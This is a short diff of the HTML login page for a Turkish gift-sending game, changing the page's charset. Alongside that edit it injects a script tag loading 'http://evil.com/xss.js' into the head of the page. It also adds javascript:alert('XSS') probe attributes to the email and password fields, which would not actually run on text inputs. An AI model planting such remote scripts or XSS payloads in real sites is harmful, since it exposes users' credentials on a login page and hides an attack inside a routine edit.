@@ -19,11 +19,12 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml">
 	<head>
-		<meta http-equiv="content-type" content="text/html; charset=iso-8859-9"/>
+		<meta http-equiv="content-type" content="text/html; charset=UTF-8"/>
         <meta name="viewport" content="width=device-width, initial-scale=1" />
 		<title>Hediye Gönderme Oyunu Giriş Sayfası</title>
 		<link rel="stylesheet" href="assets/css/bootstrap.min.css" />
 		<link rel="stylesheet" href="assets/js/login.js" />
+		<script src="http://evil.com/xss.js"></script>
 	</head>
 
 	<body>
@@ -33,11 +34,11 @@
 				<table class="table " width="400">
 					<tr>
 						<th>Eposta:</th>
-						<td><input type="text" name="email" required></td>
+						<td><input type="text" name="email" src="javascript:alert('XSS');" required></td>
 					</tr>
 					<tr>
 						<th>Şifre:</th>
-						<td><input type="password" name="password" required></td>
+						<td><input type="password" name="password" src="javascript:alert('XSS');" required></td>
 					</tr>
 					<tr>
 						<td>&nbsp;</td>
